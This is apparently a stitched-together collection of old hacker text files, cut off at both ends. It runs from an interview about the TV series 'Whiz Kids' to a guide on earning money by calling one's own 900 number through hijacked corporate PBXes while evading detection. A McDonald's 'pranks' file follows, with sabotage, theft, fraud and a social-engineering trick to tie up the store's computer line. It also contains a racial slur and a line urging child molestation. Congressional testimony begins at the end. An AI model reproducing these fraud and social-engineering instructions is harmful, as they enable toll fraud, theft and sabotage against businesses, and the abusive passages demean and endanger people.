microcomputers and I&#039;m fairly knowledgeable myself,&quot; he says.  &quot;We have a
technical advisor on the show who is an investigator for the District
Attorney&#039;s office and is a peace officer who has specialized in computer
crimes for years.  So, when it comes to areas of legality on the one
hand and technical accuracy on the other, we go to him.  This is a very
tiny portion of what&#039;s going on in the series.  I personally would
prefer the technological aspects to be handled as accurately as possible
and I would rather have it believable than sound stupid.

&quot;In many cases we will have characters spewing a lot of jargon and it
happens to be true but it&#039;s not intended to be something the audience
has to follow.  It&#039;s like medical shows where the doctors are talking
about this and that,&quot; DeGuere explains.

The series will be a fast-paced mixture of adventure and intrigue that
usually has the kids stumbling upon a problem and then acting quickly to
stop the crime or criminals without getting caught or killed.  Added to
the stories will be glimpses of their home lives and interrelationships.
DeGuere repeats his hope that the show catches on and finds an audience
so he can have the kids grow and develop, something fairly unique to
series television.  &quot;If the show clicks, we have it cast in a way that
allows us to follow them right on through college,&quot; he optimistically
offers.

When not in school, the kids will be clustered around Richie&#039;s home
computer and trying to crack cases.  Richie has built a complicated
system that would be any hacker&#039;s dream including a voice activated
system named RALF complete with camera and robot appendages (This way
Richie can eat a sandwich while using both hands to manipulate the
keyboard).

DeGuere offers some upcoming storylines as examples of the broad mixture
of the series.  &quot;Richie has a friend who he met at the computer store,
who happens to be a data processing manager for a local chemical
company.  As it happens, they have just installed a new computer
security program and he thinks the best way to test the program is to
have a hacker like Richie try and break it.  He hires Richie who breaks
into the system and discovers a Trojan Horse buried in the computer.
There&#039;s a program running inside the computer, developed by a bunch of
unscrupulous people working at the company.  These people are in the
process of doing chemical biological warfare of their own, for sale to
unfriendly third world nations.

&quot;Needless to say, the project manager quickly disappears and Richie is
the only one who knows he&#039;s in trouble.  He doesn&#039;t know why but he
knows his friend is gone.  The kids unravel the mystery.&quot;  The show will
also feature a guest appearance by &quot;Simon and Simon&#039;s&quot; Jameson Parker in
a bid by DeGuere to help link together the two CBS series.  Later in the
season when the Simons need some computer expertise, they will approach
Richie.

&quot;Or,&quot; DeGuere offers, &quot;There is a computer used in the San Fernando
Valley linking all the policemen to the department&#039;s computer.  It&#039;s
been the subject of a lot of articles because of cost overruns.  Our
story suggests that a clever criminal can figure out how to emulate one
of the Mobile Data Terminals or the host computer.  These are a bunch of
bank robbers who figure out hat with come high tech stuff, they need
only 15 minutes to get into the banks, get the money and leave.  All you
have to is make sure all the local police units in the area that could
respond to the call are unavoidably detained for 15 minutes.

&quot;That&#039;s what they&#039;re doing at the start of the story.  Everyone thinks
it&#039;s a matter of computer error until Richie says, &#039;There&#039;s no such
thing as computer error.  It&#039;s people error.&#039;  They go on to prove that
by stumbling on to the criminals.&quot;

During the conversation, held long before the series finally premiered
on October 5, DeGuere points out things are still developing.  &quot;We are,
at the moment, waiting to see how several different approaches to
storytelling turn out on film.  Right now, I&#039;m just seeing the rough cut
of the first episode after the pilot.  So I&#039;d say we&#039;re in the gestation
period right now.  We are not one hundred percent sure of what mutations
are going to be appropriate for this particular child.  None of the
things are quite formulated yet.

&quot;We&#039;re trying to inject and build into the scripts as many solid
entertainment values as we can.  We want to have characters you care
about, relationships that feel real and a general sense of fun rather
than try and throw everything about computers into it.  We&#039;re trying to
make it high tech on a lot of different levels, not just computers.

&quot;What happens on a new show, based on past experience, is that you don&#039;t
know what is really working.  I don&#039;t know until I get a chance to go
home on Wednesday night and watch the evening news, watch the promos.  I
like to see how it leads into the movie and by that time, I will have
begun to have an impression of what we&#039;re doing right and what we&#039;re
doing wrong.  Most series hit their peak, in terms of quality, in the
middle of their second year.  It&#039;s true of &quot;Simon and Simon&quot; and it&#039;s
true of almost every other show I&#039;ve worked on.&quot;

The show was originally scheduled to air on Saturday nights but over the
summer CBS switched it to Wednesday explaining that it would be a better
opportunity to attract the youthful audience a show like &quot;Whiz Kids&quot;
needs as a base.  There are more TV sets in use on a Wednesday and the
competition is diffuse with ABC offering &quot;The Fall Guy&quot; and NBC serving
up more &quot;Real People.&quot;  This gives the show a better chance than if it
was put up against &quot;Different Strokes,&quot; &quot;Silver Spoons&quot; and &quot;T.J.
Hooker.&quot;

&quot;My personal feeling is that the show will be given a reasonable chance
to succeed.  It will probably mean two or three weeks after the World
Series and if, by then, it has not established an audience, I do not
anticipate it will be moved around--I don&#039;t know where they could move
it to, frankly.&quot;

As a result of researching the series, DeGuere who owns an Apple at home
and has an office automation system in place, feels that he is fed up
with computers.  He complains of not being able to find the interest in
running programs on his personal computer and has spent weeks getting
the office system to work properly.  Between that, researching the
series, watching the critics nitpick &quot;WarGames&quot; apart and the press
reporting every move made by the nation&#039;s hackers (most notably the 414
gang) he&#039;s fed up.  &quot;People are being bombarded about computers
everywhere they turn.  They take five steps and somewhere you&#039;ll be hit
by the subject.  Consequently, there may be an overkill factor involved.
The best of all possible ways our series can benefit from &quot;WarGames&quot; is
if a large number of our potential audience think that &quot;WarGames&quot; was a
movie they might have wanted to see if they wanted to go to the movies.&quot;

Fact or fiction, reality or overkill, Phil DeGuere is hoping that his
series, co-created with producer Robert Shayne, will find a place in the
prime-time sweepstakes.  The idea is certainly unique and he is
fortunate enough to have had the show in development when the rest of
the world was just beginning to understand the important impact
computers are having on our lives.  Now, the question remains, do people
care enough to tune in once a week and watch a group of students battle
for truth, justice and the American Way using microchips, floppy disks
and modems instead of guns, badges and sirens!

The information presented forthwith is the result of knowledge gained through
actual first-hand experience.  There is no theoretical aspect to any part of
this article, except where explicitly noted.  Disclaimer:  this file is for
outright illegal use.  I sincerely hope publication of this file contributes to
the delinquency of both minors and adults alike. -- &quot;Codec&quot;

Getting Started

In setting up your own 900 number, you earn a big percentage of the net revenue
generated by calls made to that number.  You can advertise and promote your
number in various and sundry ways in an extremely competitive environment,
or--if you so happen to be a hacker--you can simply dial up some PBXes and call
the number yourself.  Since you&#039;ll be earning several dollars per minute, you
won&#039;t be in any hurry to hang up.  In fact, you may find yourself letting the
phone stay off the hook while you chat on IRC or read the latest Phrack.
Though not a scheme to get rich, this can provide a considerable income or
simply an occasional bonus, depending on your h/p resourcefulness and effort
exerted.

Before you can start calling your own 900 number and making yourself money, you
need to buy into the 900 business.  On your next outing for the latest copy of
Hustler, grab a USA Today.  In the classifieds, (as well as many other business
classifieds), under the heading &quot;business opportunities,&quot; you&#039;ll notice any
number of 900 ads.  You want to find a &quot;service bureau&quot; and not a simple
&quot;reseller,&quot; so shop around and call a number of the companies, asking about
percentages and whether or not your setup costs (usually ranging from $300 to
$1500) are comprehensive for the year or whether you&#039;ll have to pay a monthly
fee.  Avoid these pesky monthly maintenance fees.  All sorts of 900 packages
exist, but you want an automated service--such as a dateline--that is ready to
all as soon as you&#039;ve paid.  This means you&#039;ll have no equipment to set up, or
900 trunks terminating at your house, or hookers to hire, etc.  The service
bureau provides you with the number and the service, so all you have to do is
market the number (should you be legit).  You can bargain a little on the setup
fee.  An example of a worthwhile deal would be as follows:  an automated
dateline number (similar to a voice ail system, only you listen to personal ads
and have the option of leaving a response) for $750/year, a per minute rate of
$3.99, and a 75% net return (i.e., you make about $3.00/min).  AT&amp;T and MCI
provide 900 services to the service bureaus.  AT&amp;T is preferable, as you
receive payment two months after the end of the calling month, as opposed to
three months with MCI--so ask about this too.  Your continued efforts will reap
a monthly check thereafter.

The service bureau actually sends you the check.  You&#039;ll want it in a personal
name to make it easier to cash with your bogus ID.  Some bureaus will &quot;factor&quot;
your account, meaning that if you&#039;ve accumulated a lot of credits, they will
pay you in advance of their getting paid by the carrier--for a percentage fee.
Don&#039;t try to scam them on this; your account is scrutinized closely before a
premature check is approved.  If everything is done properly, both you and the
service bureau will be happy.  [That&#039;s what&#039;s so great about this project:
everyone wins--you, the service bureau, even AT&amp;T--only the PBX owner loses!]

You will be able to check your credits, or &quot;minutes&quot; as called in the 900
industry, by calling a special number provided by the service bureau.  After
entering your account codes, an automated response will give you statistics
such as daily call reports and total minutes accumulated for the billing month.
Be sure to find out about the virtual end-of-month date.  The end of each
billing period is not necessarily the last day of the month.  Accordingly, you
will need to plan your attacks with this in mind, as we will discuss next.

Getting A Date

Now that you&#039;ve set up your dateline, you&#039;ll be anxious to start earning the
three bucks a minute.  The dateline makes it kind of fun, since you get to hear
all kinds of ridiculous messages and the typical horny soliloquy.  Get a
speakerphone if you lack one now.

You don&#039;t necessarily need PBXes--any outdials you find that complete a 900 call
will suffice.  However, the lines targeted must be those of a business, one
that is large enough to own a PBX.  Calling on residential lines, cell phones,
or from small businesses will not work--the owners will get their bill, and
simply call the phone company and complain that they didn&#039;t make the call.
This will attract undesired attention to your line by the LEC and your
service bureau, and it will also cost you in that the carrier connect fees,
about .25 and .30 per minute, will be deducted from your account.  The LD
carriers get theirs, whether the party pays or not.  This is why the calling
method encouraged here is the PBX.  If you can manipulate central office
switches, do so by these same principles.

PBX owners tend to pay their phone bills--including 900 calls that aren&#039;t
outrageous.  They&#039;ll assume that one of their own employees made the call, if
they even notice.  Instead of attempting to exploit a PBX to some astronomical
degree, you&#039;re better off running up a mere fifty to sixty dollar charge.  Do
this every month as part of a schedule.  Not only may it go unnoticed, but you
are assured that it will go uncontested even if detected.  Running up an
excessive number of minutes risks unneeded attention and assures either a total
&quot;killing&quot; of the PBX, or at minimum, 900 restrictions added by the PBX
administrator.  Even with a remote admin access, your luck will run out.
Remember:  YOU WILL ONLY GET PAID IF THE PBX OWNER PAYS THE PHONE BILL!

With this in mind, the most limiting factor is the number of PBXes you can
accumulate.  The widespread raping of AT&amp;T&#039;s System 75/85/Definity in 1992 (as
a result of discoveries in 1991) made that year extremely ripe for this 900
scheme.  Many of us managed to accumulate large collections of System 75s,
including the elusive Super Nigger, who allegedly compiled over 300.  (Where
the hell were you hiding?)  AT&amp;T security memorandums have since killed
hundreds of these, but the defaults still work well in some cities.
Regardless, PBXes abound, and the more you find, the more minutes you can
generate.

Let&#039;s look at a sample attack schedule:

PBX #           M       T       W       Th      F       S       Su
 01             15m
 02             10m
 03              8m
 04                             14m
 05                             16m
 06                             24m
 07                             12m
 08                             13m
 09                                     16m
 10                                             2m,10m
 11                                             13m
 12                                             4m,4m

Twelve PBXes are to be attacked in the sample week, so there are probably fifty
PBXes totally to be attacked for the month.  Each PBX is to be used only once per
billing period.  You will  get many months of use out of each PBX with this
conservative approach, so long as every hacker west of Poland doesn&#039;t have
access as well.  Notice how the number of connection minutes varies, and the
calling pattern is quite random looking.  The schedule is maintained not only
to keep track of PBXes in your harem you&#039;ve fucked for the month, but to assist
you in generating minutes in a pseudo-random pattern.  It is acceptable to have
your minutes generated in a pattern, albeit a loose one.  For instance, if all
minutes are generated only on the weekend, a discerning eye will not attribute
this to the type of marketing you are using.  The sample schedule is only the
ideal model.  Having to rigid a pattern, however, such as having an exact
number of calls each day, is potentially suspicious to your service bureau.
Simultaneous calls to your 900 number through different outgoing trunks on the
same PBX is also strongly discouraged.

Listening Software

Calling your 900 dateline number is fun, but when you&#039;ve got over a hundred
PBXes to hit each month for an average of fifteen minutes a pop, the novelty
tends to wear off.  Of course you can have a speakerphone and a time and go
about other tasks between calls, but why not write a program that will enable
your modem to do all this for you?  All the program must do is have the modem
call a PBX from a list, pause, and call your 900 (or another PBX and then your
900, for LD PBX attacks).  Once connected to your 900, it must stay &quot;listening&quot;
until a random timer (10-20 minutes) hangs it up.  Depending upon your dateline
service, the modem may have to emit a DTMF every once in a while to keep the
service convinced you&#039;re still there.  This is a very worthwhile program to
write--it can drastically reduce your total time spent with this operation,
leaving you with only the PBX list to maintain (additions and deletions), and
the spending of your hard-earned cash (the novelty of this WON&#039;T wear off).

Large Charge-Rate Option

A 900 number can be set up to charge as much as $50 per call.  Whether the call
lasts less then a minute, or for over ten, the cost for the caller is the same
$50.  In order to set up such an account, you must qualify as an &quot;Information
Provider,&quot; or IP.  Regulations on 900 numbers state that you must be a provider
of information, not tangible goods.  With a dateline, the information is
included in your deal with the service bureau, so you are considered an IP.
The bureau can provide you with your own number that terminates in a voice
processing or audio-text system, but now you must provide the actual
information.  Your idea must be approved by the LD carrier, and they tend to
scrutinize your plans the higher your desired rate.  Your bureau may even
subject your service to a test to make sure it&#039;s not a fake.

One idea is to ask for a $25 per-call rate.  Make like a writer of shareware
programs, and have your 900&#039;s announcement ask the caller to leave name and
address to be legally registered to use the software, and to receive updated
versions.  A confirmation notice will be sent to acknowledge the registration.
Many bureaus will accept this as qualification for IP status, if properly
presented.  A sample arrangement like this should not cost more than a grand to
set up.  Stats on minutes are checked just as with the dateline, only you&#039;ll
receive any messages left by callers, and you&#039;ll receive any messages left by
callers, and you&#039;ll be able to change the announcements--just like voice mail.
[IT&#039;s always a thrill to call a 900 number and hear yourself thanking the
caller, heh heh.]  On a $25 line, you should net about $19 per call.

All the same rules apply using this large charge-rate setup.  You can&#039;t abuse a
PBX any more with this option then with a dateline.  It does give you the added
flexibility for methods used other than PBXes, such as outdials that will only
connect briefly.  For instance, message notification on voicemail will not
connect to a number for prolonged durations, but long enough to activate a $25
charge.  And a typical modem outdial on a mainframe will soon hang up with the
absence of an answering carrier, but the linger is long enough for a $25 call.
And with CO switching, the arrangements you make are ideally temporary--turned
quickly on and off--making a fast $25 hit optimal.  Lastly, if you are skilled
in accessing corporate phone closets (see &quot;Physical Access and Theft,&quot; Phrack
43) or the corresponding outside plant, you can use your test set to call your
900.  Obviously a large charge-rate would be better here too, rather than
standing for endless periods of time in compromising positions connected to a
squawking dateline.

No matter how you access business lines, be sure they belong to a large
company.  Definitely experiment, but do so in moderation--make any necessary
notes (like time and date of call) and wait for your 900 billing statement to
see if the call was paid for.  [Your billing statement, essentially a call
accounting summary, is created for each billing month by the LD carrier and
sent to you via the service bureau with your check.  It includes the calling
phone numbers, time, date, duration, etc. of all calls made to your number.]

A Final Word

It would be hard to get &quot;busted&quot; doing anything mentioned in this article.
Even if you&#039;re nabbed for misdemeanor PBX abuse, no one will ever imagine--let
alone try to prove--that the 900 number you were calling is your own.  [Hey,
you&#039;re just a desperately lonely guy!]  However, be wary of pen registers
(DNRs) if you&#039;ve been up to other dark deeds, and set up your calling
operations at a safer place.  Don&#039;t check your minutes using any of the same
means that you use to generate them (a record of your calling into your 900
backdoor is probably the most incriminating track you can make).  Keep your 900
account anonymous, as with your address, voice mail, and ID/SSN.

Welcome to the dark side--and best of luck.

                        Sincerely,

                        CO/der DEC/oder

                     Screwing over your local McDonald&#039;s
                                - Charlie X -

INTRODUCTION

     Ok... everyone is familiar with the world&#039;s largest and fastest
growing fast food chain, McDonald&#039;s. The founder, Ray &quot;Crock&quot;, wanted an
environment where families and friends could get food with friendly
service at any time of the day... Boy, what a crock, at least now.

    To top everything off, McDonald&#039;s attacks decent food establishments
by criticizing the food content... not like you&#039;ll find anything not
genetically engineered in McDonald&#039;s food... Everyone must realize that
McDonald&#039;s sucks, and you must do your part to put the fucking place out
of commission...

     As far as I can tell, everyone in McDonald&#039;s is rude and has an
attitude, from the management to the customer. They, as most
restaurants do, firmly believe THE CUSTOMER IS ALWAYS RIGHT. This is
true even when the customer is an asshole with blind disregard for
everyone and everything. This is where you come in... Here are a few
things that you can do to put your local McDonald&#039;s in it&#039;s place...

     Recently in the news, a major group sited McDonald&#039;s as the most
environmentally responsible establishment on the planet (note: this is
even over green peace and Sally Struthers)... how the hell is this
possible?

SENIOR CITIZENS BENEFIT DAY/WEEK

     McDonald&#039;s is nice to senior citizens. Every McDonald&#039;s offers
free or reduced price meals or drinks to Senior citizens... Now, all
you have to do is attract them. For a minimal price, you can publish
an ad in the local newspaper, or publish your own flier (can be
cheaply made) which explains that a certain day/week, your local
McDonald&#039;s will recognize senior citizens with free food, coffee,
senior activities, you know... a big senior social. You may want to
mention that other organizations will be there to speak and make the
whole &quot;event&quot; decent... Now, if your McDonald&#039;s already offers
free/reduced coffee, food, or sodas, this will definitely break them,
and cause them to order much more supply, and could even cause them
to run out of coffee or soda for the rest of the day... on the other
hand, if they don&#039;t offer this, the mass crowd of old people asking
for shit will certainly piss someone off... This has been tested, and
as a result, a McDonald&#039;s had to close for a day to reorganize and
reorder supplies, as well as &quot;launch an investigation&quot; about this
Day, but they never turned up anything.

GARBAGE CAN TRICKS

     Since McDonald&#039;s is usually a busy restaurant, the trash bags
fill up quickly and must be changed frequently (but never are.) There
are several things you can do to the trash cans. For starters, ask
for hot or boiling water. If you don&#039;t want to attract attention by
doing this, bring in your own really hot water... boil it, put it in
a Styrofoam cup or a thermos... once in McDonald&#039;s, locate the filled
trash can (should not be hard to find) and dump the hot water down
the side. Not only will this melt the side of the bag, causing the
trash to go everywhere, the person who takes out the garbage must
pick up all the trash by hand and dump out the trash can with water
in the bottom. This also soaks the trash, breaks up paper, and makes
the whole experience quite unpleasant, but hilarious to watch.

     Another easy trick is to walk up to the trash can areas, take
the trays sitting above the trash cans, and simply throw them in all
the cans. This will either make the employee fish them out by hand,
or will cause the restaurant to be short of several trays, which
becomes quite annoying.

FOOD TRICKS

     There are several things to do with the food. Since there is
probably something wrong with it in the first place, you might want
to simply make the problem bigger... Before you enter the restaurant,
cut some of your hair, or hair off of a pet. When at your table,
place the hair all over the inside of the burger. When the line at
the counter is long, and everyone is busy, cut up to the front of the
counter, and start complaining about your burger. Show EVERYONE the
hair inside the burger. You will get another burger, and most likely,
a lot of free shit so you will come back. You will also cause most
everyone to leave, and people in the kitchen to get shit on by the
manager.

ON A BUSY DAY...

     Busy days are the best. Customers are in a hurry, so are the
employees... everyone has a short fuse and usually do not pay
attention to what you say, or get very pissed. Ask for real dumb
shit... For example, &quot;I&#039;d like a 69 piece Chicken McNugget.&quot; The best
thing to do is to order a simple cheeseburger, and screw it all up
with special orders... For example, &quot;I&#039;d like a cheeseburger, with
extra cheese, no mustard, extra catsup, extra onions, lettuce,
tomato, a real little dab of mayo, and make it well done... oh wait,
I don&#039;t want cheese anymore. Just put extra lettuce on it... [wait
for them to send the order back to the kitchen]... then Oh, wait,
sorry... I just want a BigMac.&quot; You can also say, &quot;I&#039;d like a medium
Coke with just 4 pieces of ice in it.&quot; They will always do what you
say... Keep in mind that special orders do not cost extra, so you can
order a hamburger, ask for extra mustard, catsup, and somewhere in
there, casually mention extra cheese... 9 times out of 10 this
works... and you don&#039;t get charged. NOTE: if you hear a printer
printing followed by 3 beeps somewhere in the kitchen, your grill
order was printed, and will be made... so change it after you hear
that.

     In some McDonald&#039;s, you will find the &quot;Need A Penny - Take a
Penny,&quot; Where people put in their loose change in case someone else
is short some money... steal ALL the money in this. In one month, I
made $42.71 from stealing the money from all the Need A Penny cups in
my area... This is a good secondary income for lazy people.

     If you plan on a big order, start off by telling the person you
just want a soda. After they give a total and get ready to take your
money, add an item. Keep saying &quot;That&#039;s it&quot; and repeat this process
until you have what you wanted, and have wasted several minutes. You
can also have the cashier repeat your order as many times as you
wish, also wasting time.


THE INQUIRING CUSTOMER

     McDonald&#039;s managers pride themselves in knowing the answers,
and employees like to pretend that they do. So, on a busy day, keep
asking dumb questions... Here are a few to ask... Oh, never actually
order anything... just hold up the line with your questions. Here are
a few questions to ask:

     - &quot;How is your meat prepared at the factory?&quot;
     - &quot;What part of the chicken does the McNugget come from?&quot;
     - &quot;Who was the BigMac named after?&quot;
     - &quot;What is the post-cooked weight of your quarter pounder?&quot;
     - &quot;Where does your &lt;pick a vegetable&gt; come from?&quot;
     - &quot;How fresh is your &lt;McD product&gt;?&quot;
     - &quot;What is the square root of 69.666?&quot;
     - &quot;What is the nutritional value of a 9 piece McNugget box?&quot;

DRIVE-THRU FUN

     McDonald&#039;s videos tell the employees that the Drive Thru makes
up for more than 40% of the average McDonald&#039;s business. Simply put,
this system needs a lot of work. The speakers rarely work, and you
usually get your order screwed up. The first thing to do is to take
your car and back over the cut square in the pavement right beside
the order sign several times. This causes a loud annoying &quot;bong&quot; to
be heard by everyone with a headset... eventually the manager will
come out with a weapon, and this is where you leave.

     Another thing to do is to drive up, and say, &quot;I just want a lot
of butter...&quot; or &quot;I&#039;d like a large penis to go please.&quot; Usually,
people in the drive thru service will laugh or screw something up,
and you will get yelled at by the manager... waaah.

     If you want free food, order something in the drive thru. Keep
your window down to listen to other orders. After you receive your
food, park and enter the restaurant. Go to the front of the line and
tell the person on duty that your order was screwed up... it helps to
remember what someone else&#039;s order was, and then you just ask for
that... you will get it. Sometimes, you even get free food for having
a screwed up order.

     This prank requires guts, but can be somewhat amusing. Simply drive
up in front of the sign, turn your engine off, and go inside the restaurant
and eat. There&#039;s always room to park in the drive-thru lane... You could also
tell the drive-thru person that your car stalled, and you will have to call
the motor club. This can put a drive-thru out of commission until you decide
to move your car.

     If you happen across a McDonald&#039;s that is expecting deliveries, or has
cleaned the parking lot, you will notice traffic cones. You can move these
cones around the drive-thru sign. Some people are stupid and will drive thru
them anyway, so you may want to place a sign saying &quot;DRIVE THRU CLOSED -
- SORRY - MANAGEMENT.&quot; You can also place a legitimate order at the drive thru
and right after your order, you can put a sign on the drive-thru sign saying
the same &quot;closed&quot; message. The drive thru sensor does not sense foot traffic,
so you can walk up to the sign and put one there...

     The drive thru headsets can be a good source of amusement. When
ordering, mumble your order, scream it real loud, or say it like the
microphone is cutting out, for example, &quot;I&#039;d like to order a LARGE
ibbit-obbt-ibbit-urger with no Sa... and extra &lt;crackle&gt; and I&#039;d also
like a Med&lt;cut&gt; Oke.&quot; When they ask you to repeat, do the exact same
thing. Remember, that as soon as you drive up to the sign, they can
hear everything in your car... even if they are not talking. As soon
as they ask for your order, turn your stereo up real loud, and begin
to say your order... this screws everything up... Also, ask for a
hotdog, or an item that you know they don&#039;t have. If you have the
guts, are really bored, and are not driving YOUR car, take them
seriously when they say &quot;please drive through.&quot; This would be the
ultimate action, putting your local McDonald&#039;s out of business.

    If you have a simple shortwave transceiver, Ham Radio, or powerful
handheld transceiver, you can talk to the entire drive-thru crew.
The antenna is located above the cashier in the drive-thru box and has
a receiving radius of the entire store and about half of the parking lot.
You can add stuff to peoples orders, or just screw around. Drive thru
people have noticed that illegally powerful CB radios, side band radios
and even some car phones can be picked up with the headsets. Be innovative
and use these to piss the employees off. If you do not have access to one,
simply hide behind the sign, and shout extra food or obscenities at
the sign...

GREASE DISPOSAL FUN

     This next trick involves little or no intelligence, or imagination,
but seems to get people every time. Behind McDonald&#039;s, usually found next
to trash cans or the empty soda-syrup containers, you will find a large
drum marked &quot;not-fit for human consumption&quot; or &quot;inedible contents.&quot;
Although these warnings belong in the food, they mark the grease vat. This
is tightly sealed for a reason... it smells like dead human. They are also
easy to open. Usually, you can loosen the ring around the top and open
the lid. Be sure to cover your face when you do this... it does smell like
shit... The nice thing about this is that the smell will cover the entire
parking-lot area in roughly 10 minutes. Chemically, the smell will cause
nausea, and definitely a loss in appetite. People will get sick everywhere,
and definitely cause a loss of customers at McDonald&#039;s...

     A simple addition to the previous trick would be to tip the can. The
grease will probably have hardened, but on a warm day or if the black
can is left in the sun, it will leave a sticky, raunchy mess in the
parking lot that will be impossible to clean up, and will stink infinitely.
This is a way to make the trick more damaging and longer lasting.

DUMPSTER FUN

     McDonald&#039;s, or any fast food restaurant usually has a high volume of
garbage output (not including the food). If you can travel around and
find large objects, you can dispose of them in the trash containers. If
you clog them up, not only will the store have to pay for an extra
collection of trash (to remove what you put in there), They&#039;ll have to pay
extra for later (or earlier) you do it, as well as what kind of objects
you put in there. You can also put the empty silver soda containers, bread
racks, or even signs and loose McDonald&#039;s shit in the trash. They won&#039;t
appreciate the loss, and it&#039;s gonna cost them money at both ends. Lame
but definitely effective.

PHONE ORDER PHUN

     One thing that is not very well known is that McDonald&#039;s accepts phone
orders. This is a simple process. A serious, adult sounding voice can call
a local McDonald&#039;s and claim that they have a large order that they would like
ready for pickup. You supply a BS phone number, a BS name, and a BS order. The
larger it is the better. Usually give about a half an hour to an hour notice
to have the order ready. Good reasons for the orders are usually family get-
togethers, meetings at local universities, etc. The university excuses are much
better, because you can supply a college phone number (found in the phone book)
and if they call (the usually don&#039;t) to verify the order, they will get the
office, and will think it&#039;s legitimate. This prank is a beauty because after
the manager takes the order, it is given directly to the kitchen, who begins the
order. Again, they very rarely verify the orders, so it is easy to pull these
off. To make this prank better, you should throw in mass quantities of food
items that people NEVER eat -- Filet O&#039; &quot;Fish&quot;, Fajitas, etc... You can also
call them back at the time of pickup, and say &quot;sorry, we decided to eat at
burger king...&quot; DO NOT enter the restaurant and ask to buy the items at a
cheaper price, like the old pizza man trick... that&#039;s just lame.

COMPUTER PHUN

     A nice thing about McDonald&#039;s is that it is linked via computer (and modem)
to OakBrook, Illinois. Check your local phone book for a McDonald&#039;s with 2 lines.
The second line is usually the computer line. You may also try Information.
If you aren&#039;t able to get the number, read these next 3 parts...

     - McDonald&#039;s are listed by Restaurant number in the phonebook. You can
       retrieve the number, then call the restaurant, asking for the manager.
       When the manager identifies himself, with his name, you write the
       name down, and tell him to get bent or something.  With that information,
       you can call McDonald&#039;s 800 number, or any McDonald&#039;s Corporation HQ number
       in OakBrook, Illinois (they will relay your call). You say you haven&#039;t
       been receiving updates or any purchase orders, you identify yourself,
       and your store number, and location (city, state...). They will check
       the listings, and read off the phone number of the computer. If they
       won&#039;t give it to you, they will allow you to change the computer number,
       where you give them your enemies phone number or something, and they
       will get called by modem repeatedly...
     - Call your local McDonald&#039;s, identify yourself as Bill Haggan of Computer
       Services, McDonald&#039;s, Oakbrook... etc. Say you are updating your records,
       and need the computer telephone number. Get the number, then give them
       a bullshit verification number.
     - This is not very imaginative, but it works... it&#039;s also risky... wooooo.
       Find the phone box, open the user service box, connect any phone with an
       RJ-11 adaptor to the box and type your local ANI number (211, 811-9967)
       etc... do that for each line that enters the restaurant. Then reconnect
       it... you have the numbers.

     Now that you have the numbers, there is a lot you can do. It is not wise to
enter the computer. Although goodies are buried there, any changes you make are
corrected that night with a verification call. It is also verified voice.
However, everything in the restaurant is connected to the computer. Once you
call the number, and connect to the computer, just sit there. The computer
freezes all time clocks, order programs, etc. Every display will be marked
&quot;BUSY.&quot; This prevents anyone from punching in or out, the manager from checking
labor, printing schedules, do inquiries about anything... basically interrupt
most managerial and owner duties. If you find a constant busy signal, this
is very easy to correct. Simply ask for an operator interrupt. If the operator
breaks in, the beep will hang up the modem, allowing you to call right in.
This prank does have profound effects on the McDonald&#039;s. It is highly
recommended.

FREE SHIT AT McDonald&#039;s

     Yes, I do mean shit... If you are involved in that fucking money crunch
like everyone else, and you feel that your money should be spent on better
things, rather than shitty food, here are a few pointers for free food.
These have all been tested. If you are caught in the act of getting free
food, nothing will happen, and it will be a big source of amusement...

Cheeseburger -  On a busy drive-thru day, you can ask for a special order.
  Ask for a hamburger with an extra item, like mustard or
                something, and casually sneak in &quot;extra cheese.&quot; If the
  employees are stupid enough (a given), and the grill doesn&#039;t
  question it, you will find yourself with a nice fresh
  cheeseburger for the price of a hamburger... whoopee...
Any Item -      The BEST thing to do is order something in the drivethru,
  and then come in the restaurant with the bag from drive
                thru and say &quot;You forgot ...&quot; If you ask the employees at
  the counter, 9 times out of 10, you will get it... To be
  on the safe side, you may want to go home, call the
                McDonald&#039;s, say you went through the drive thru and you
  didn&#039;t get your food item. You can give a bullshit name
   or whatever, usually they don&#039;t even take the name, and
  the next time you go in, you say you called, and you will
  get gift certificates or free food... works every time.

BASTARDIZING FOOD ITEMS

     If you want to attract a certain degree of attention to yourself, and
make employees and customers laugh, when you order food, fuck up the names
to say something cool... You&#039;ll still get the food you don&#039;t want, and this
too is a source of amusement. Spur-of-the-moment name bastardizations are
by far the funniest, but here are a few suggestions...

SHMEGMA MAC, SHMEGMA SACK - instead of Mega Mac (shmegma is Dick Cheese)
CHICKEN McFUCKUPS - Chicken McNuggets (be sure to ask for the 69 piece)
McDICKEN - McChicken (ask for extra Mayo and smile...)
CHOKE - Coke (I&#039;d like a small choke with no ice)
McRIBBED FOR HER PLEASURE - McRib... Do they still make this?
FAGINA - Fajita (I&#039;d like a FAGINA with extra cheese...)

IMPORTANT

     Remember that McDonald&#039;s slogan is Food, Folks, and Fun...
Just take the &quot;fun&quot; part to the limit... You sort of have to compensate
for the asshole &quot;folks&quot; and the shit &quot;food.&quot;

     If you get bored, start molesting kids on the
playland or just break shit... throwing salt shakers (plastic or
glass) at the outside wall of the McDonald&#039;s is fun too... take
advantage of whatever there is in McDonald&#039;s... there are infinite
possibilities to create your local McDonald&#039;s an utter McHell. Don&#039;t
consider it illegal (most of it isn&#039;t...) consider it more of a
public service. Yeah... That&#039;s it.

     STATEMENTS OF DONALD P. DELANEY, SENIOR INVESTIGATOR, NEW YORK
STATE POLICE; JOHN J. HAUGH, CHAIRMAN, TELECOMMUNICATIONS ADVISORS;
EMMANUEL GOLDSTEIN, PUBLISHER, 2600 MAGAZINE; PETER S. TIPPETT,
DIRECTOR, SECURITY AND ENTERPRISE PRODUCTS, SYMANTEC CORP.; AND
MICHAEL A. GUIDRY, CHIEF EXECUTIVE OFFICER, THE GUIDRY GROUP
     Mr. DELANEY. Thank you, Mr. Chairman, for the invitation to
testify today.
     As a senior investigator with the New York State Police, I
have spent more than 3 years investigating computer crime and
telecommunications fraud. I have executed more than 30 search
warrants and arrested more than 30 individuals responsible for the
entire spectrum of crime in this area.
     I authored two chapters in the &quot;Civil and Criminal
Investigating Handbook&quot; published by McGraw Hill entitled
&quot;Investigating Computer Crime and Investigating Telecommunications
Fraud.&quot; Periodically I teach a 4-hour block instruction on
telecommunications fraud at the Federal Law Enforcement Training
Center in Georgia.
     Although I have arrested some infamous teenagers, such as
Phiber Optic, ZOD, and Kong, in some cases the investigations were
actually conducted by the United States Secret Service. Because
Federal law designates a juvenile as one less than 18 years of age
and the Federal system has no means of prosecuting a juvenile,
malicious hackers, predominately between 13 and 17 years of age,
are either left unprosecuted or turned over to local law
enforcement. In some cases, local law enforcement were either
untrained or unwilling to investigate the high-tech crime.
     In examining telecommunications security, one first realizes
that all telecommunications is controlled by computers. Computer
